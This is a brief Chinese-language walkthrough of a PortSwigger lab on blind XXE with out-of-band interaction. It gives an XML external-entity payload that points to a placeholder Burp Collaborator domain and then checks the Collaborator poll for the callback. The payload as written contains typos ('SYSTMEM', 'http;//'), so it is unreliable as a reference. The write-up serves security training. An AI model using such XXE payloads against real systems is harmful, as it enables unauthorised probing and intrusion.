# [靶场地址](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

### 关于本题
1. A:collaborate的poll now
   - 查一查有没有人访问我的paload域名
---

### 进入靶场
1. <!DOCTYPE stockCheck[<!ENTITY def_url SYSTMEM "your_collaborate.com">]>
   - 但是它报错了,就很烦人　　->　图1  
   - 要改成"http;//your_collaborate.com"　　->　图2
2. 发过去之后,点一下poll now　　->　图3  
**solved**